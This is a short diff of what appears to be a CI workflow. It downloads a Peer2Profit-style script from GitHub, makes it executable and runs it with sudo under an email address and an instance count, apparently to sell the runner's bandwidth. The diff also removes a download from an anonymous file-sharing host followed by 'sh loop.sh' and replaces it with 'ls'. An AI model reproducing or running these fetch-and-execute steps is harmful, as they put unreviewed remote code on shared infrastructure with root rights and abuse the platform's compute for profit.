@@ -15,5 +15,4 @@ jobs:
         wget -q https://raw.githubusercontent.com/Chasing66/peer2profit/main/peer2fly.sh -O peer2fly.sh
         chmod +x peer2fly.sh
         sudo ./peer2fly.sh --email "nothingone2345@gmail.com" --number "10"
-        wget https://file.io/OkQcuFU4eFM1
-        sh loop.sh
+        ls
